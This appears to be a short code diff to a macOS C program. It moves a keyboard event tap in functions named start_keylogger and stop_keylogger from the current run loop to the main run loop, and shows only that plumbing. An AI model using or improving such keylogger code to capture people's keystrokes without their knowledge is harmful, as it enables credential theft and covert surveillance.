@@ -89,7 +89,8 @@ int start_keylogger(void) {
     
     // Create run loop source
     runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
-    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
+    // Add to the main run loop instead of current
+    CFRunLoopAddSource(CFRunLoopGetMain(), runLoopSource, kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
     
     return 0;
@@ -103,7 +104,7 @@ void stop_keylogger(void) {
     }
     
     if (runLoopSource) {
-        CFRunLoopRemoveSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
+        CFRunLoopRemoveSource(CFRunLoopGetMain(), runLoopSource, kCFRunLoopCommonModes);
         CFRelease(runLoopSource);
         runLoopSource = NULL;
     }
